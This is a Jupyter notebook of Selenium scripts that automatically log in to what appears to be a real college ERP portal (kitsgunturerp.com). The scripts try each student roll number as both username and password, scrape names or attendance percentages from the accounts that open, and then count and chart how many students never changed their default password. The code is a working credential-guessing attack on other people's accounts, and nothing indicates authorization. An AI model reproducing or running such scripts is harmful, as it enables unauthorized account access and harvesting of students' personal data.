{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9cb0e189",
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "\n",
    "from time import sleep\n",
    "driver = webdriver.Chrome(\"chromedriver.exe\")\n",
    "driver.get(\"https://kitsgunturerp.com/BeeSERP/Login.aspx\")\n",
    "def bot(username,password):\n",
    "    loginbox = driver.find_element_by_id(\"txtUserName\")\n",
    "    loginbox.clear()\n",
    "    loginbox.send_keys(username)\n",
    "    loginbox.send_keys(Keys.RETURN)\n",
    "    passwordbox=driver.find_element_by_id(\"txtPassword\")\n",
    "    passwordbox.clear()\n",
    "    passwordbox.send_keys(password)\n",
    "    passwordbox.send_keys(Keys.RETURN)\n",
    "    try :\n",
    "        attendence = driver.find_element_by_id(\"ctl00_cpStud_lblTotalPercentage\")\n",
    "        print(username , \"percentage = \"+attendence.text)\n",
    "    except :\n",
    "        print(username,\"password is changed\")\n",
    "    driver.get(\"https://kitsgunturerp.com/BeeSERP/Login.aspx\")\n",
    "    \n",
    "\n",
    "for i in range(37,65):\n",
    "    if i <= 9 :\n",
    "        roll = \"0\"+str(i)\n",
    "    else :\n",
    "        roll = str(i)\n",
    "    username = \"20JR1A44\"+roll \n",
    "    password = \"20JR1A44\"+roll \n",
    "    bot(username,password)\n",
    "\n",
    "driver.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f3618570",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2cd19c6e",
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "\n",
    "from time import sleep\n",
    "driver = webdriver.Chrome(\"chromedriver.exe\")\n",
    "driver.get(\"https://kitsgunturerp.com/BeeSERP/Login.aspx\")\n",
    "def bot(username,password):\n",
    "    loginbox = driver.find_element_by_id(\"txtUserName\")\n",
    "    loginbox.clear()\n",
    "    loginbox.send_keys(username)\n",
    "    loginbox.send_keys(Keys.RETURN)\n",
    "    passwordbox=driver.find_element_by_id(\"txtPassword\")\n",
    "    passwordbox.clear()\n",
    "    passwordbox.send_keys(password)\n",
    "    passwordbox.send_keys(Keys.RETURN)\n",
    "    try :\n",
    "        name = driver.find_element_by_id(\"ctl00_cpHeader_ucStud_lblStudentName\")\n",
    "        print(name.text)\n",
    "    except :\n",
    "        print(username,\"password is changed\")\n",
    "    driver.get(\"https://kitsgunturerp.com/BeeSERP/Login.aspx\")\n",
    "    \n",
    "\n",
    "for i in range(37,65):\n",
    "    if i <= 9 :\n",
    "        roll = \"0\"+str(i)\n",
    "    else :\n",
    "        roll = str(i)\n",
    "    username = \"20JR1A44\"+roll \n",
    "    password = \"20JR1A44\"+roll \n",
    "    bot(username,password)\n",
    "\n",
    "driver.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ef22564",
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "\n",
    "from time import sleep\n",
    "driver = webdriver.Chrome(\"chromedriver.exe\")\n",
    "driver.get(\"https://kitsgunturerp.com/BeeSERP/Login.aspx\")\n",
    "def bot(username,password):\n",
    "    loginbox = driver.find_element_by_id(\"txtUserName\")\n",
    "    loginbox.clear()\n",
    "    loginbox.send_keys(username)\n",
    "    loginbox.send_keys(Keys.RETURN)\n",
    "    passwordbox=driver.find_element_by_id(\"txtPassword\")\n",
    "    passwordbox.clear()\n",
    "    passwordbox.send_keys(password)\n",
    "    passwordbox.send_keys(Keys.RETURN)\n",
    "    try :\n",
    "        name = driver.find_element_by_id(\"ctl00_cpHeader_ucStud_lblStudentName\")\n",
    "        print(name.text)\n",
    "    except :\n",
    "        print(username,\"password is changed\")\n",
    "    driver.get(\"https://kitsgunturerp.com/BeeSERP/Login.aspx\")\n",
    "    \n",
    "\n",
    "for i in range(1,65):\n",
    "    if i <= 9 :\n",
    "        roll = \"0\"+str(i)\n",
    "    else :\n",
    "        roll = str(i)\n",
    "    username = \"20JR1A43\"+roll \n",
    "    password = \"20JR1A43\"+roll \n",
    "    bot(username,password)\n",
    "\n",
    "driver.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6a738dd0",
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "\n",
    "from time import sleep\n",
    "driver = webdriver.Chrome(\"chromedriver.exe\")\n",
    "driver.get(\"https://kitsgunturerp.com/BeeSERP/Login.aspx\")\n",
    "def bot(username,password):\n",
    "    loginbox = driver.find_element_by_id(\"txtUserName\")\n",
    "    loginbox.clear()\n",
    "    loginbox.send_keys(username)\n",
    "    loginbox.send_keys(Keys.RETURN)\n",
    "    passwordbox=driver.find_element_by_id(\"txtPassword\")\n",
    "    passwordbox.clear()\n",
    "    passwordbox.send_keys(password)\n",
    "    passwordbox.send_keys(Keys.RETURN)\n",
    "    try :\n",
    "        name = driver.find_element_by_id(\"ctl00_cpHeader_ucStud_lblStudentName\")\n",
    "        print(name.text)\n",
    "    except :\n",
    "        print(username,\"password is changed\")\n",
    "    driver.get(\"https://kitsgunturerp.com/BeeSERP/Login.aspx\")\n",
    "    \n",
    "\n",
    "for i in range(1,65):\n",
    "    if i <= 9 :\n",
    "        roll = \"0\"+str(i)\n",
    "    else :\n",
    "        roll = str(i)\n",
    "    username = \"20JR1A43\"+roll \n",
    "    password = \"20JR1A43\"+roll \n",
    "    bot(username,password)\n",
    "\n",
    "driver.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "2171546c",
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "from time import sleep\n",
    "\n",
    "\n",
    "\n",
    "driver = webdriver.Chrome(\"chromedriver.exe\")\n",
    "driver.get(\"https://kitsgunturerp.com/BeeSERP/Login.aspx\")\n",
    "def bot(username,password):\n",
    "    loginbox = driver.find_element_by_id(\"txtUserName\")\n",
    "    loginbox.clear()\n",
    "    loginbox.send_keys(username)\n",
    "    loginbox.send_keys(Keys.RETURN)\n",
    "    passwordbox=driver.find_element_by_id(\"txtPassword\")\n",
    "    passwordbox.clear()\n",
    "    passwordbox.send_keys(password)\n",
    "    passwordbox.send_keys(Keys.RETURN)\n",
    "    try :\n",
    "        name = driver.find_element_by_id(\"ctl00_cpHeader_ucStud_lblStudentName\")\n",
    "        print(name.text)\n",
    "    except :\n",
    "        print(username,\"password is changed\")\n",
    "    driver.get(\"https://kitsgunturerp.com/BeeSERP/Login.aspx\")\n",
    "    \n",
    "\n",
    "for i in range(1,65):\n",
    "    if i <= 9 :\n",
    "        roll = \"0\"+str(i)\n",
    "    else :\n",
    "        roll = str(i)\n",
    "    username = \"20JR1A44\"+roll \n",
    "    password = \"20JR1A44\"+roll \n",
    "    bot(username,password)\n",
    "\n",
    "driver.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "1d5403f3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "14 50\n"
     ]
    }
   ],
   "source": [
    "import pandas as pd \n",
    "\n",
    "# reading the  csv file\n",
    "df = pd.read_csv(r'test/test.csv')\n",
    "\n",
    "# counting the number of guys who changed password and who did not changed password\n",
    "changedguys = df[df[\"is_password_changed\"]=='Yes'].count()[\"is_password_changed\"]\n",
    "Not_changedguys =df[df[\"is_password_changed\"]=='No'].count()[\"is_password_changed\"]\n",
    "print(changedguys,Not_changedguys)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "9788208a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "# bar  graph depicting the password changed and password not changed\n",
    "import matplotlib.pyplot as plt\n",
    "x = ['changedguys','Not_changedguys']\n",
    "y =[changedguys,Not_changedguys]\n",
    "plt.bar(x,y)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "a44d1eaf",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# pie chart  depicting the password changed and password not changed\n",
    "\n",
    "plt.pie(y ,labels=[\"changed\",\"notchanged\"])\n",
    "plt.legend()\n",
    "plt.show() "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "40ddc573",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
